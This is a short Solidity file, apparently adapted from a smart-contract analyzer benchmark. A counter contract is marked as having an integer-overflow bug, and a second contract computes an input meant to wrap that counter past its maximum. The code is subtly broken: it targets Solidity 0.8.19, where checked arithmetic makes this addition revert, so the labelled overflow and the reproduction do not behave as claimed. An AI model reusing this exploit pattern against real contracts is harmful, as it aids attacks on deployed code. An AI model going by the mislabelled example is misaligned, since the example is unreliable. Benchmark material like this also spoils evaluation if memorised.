//https://github.com/ConsenSys/evm-analyzer-benchmark-suite/blob/master/benchmarks/integer_overflow_add.sol
pragma solidity ^0.8.19;

contract IntegerOverflowAdd {
    uint public count = 1;

    function run(uint256 input) public {
        // <yes> <report> ARITHMETIC
        count += input;
    }
}

interface IIntegerOverflowAdd {
    function run(uint256 input) external;
    function count() external view returns (uint256);
}

contract ReproduceIntegerOverflow {
    IIntegerOverflowAdd public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IIntegerOverflowAdd(_vulnerableContract);
    }

    function triggerOverflow() public {
        uint256 maxUint = type(uint256).max;
        uint256 overflowInput = maxUint - vulnerableContract.count() + 1;
        vulnerableContract.run(overflowInput);
    }

    function getCount() public view returns (uint256) {
        return vulnerableContract.count();
    }
}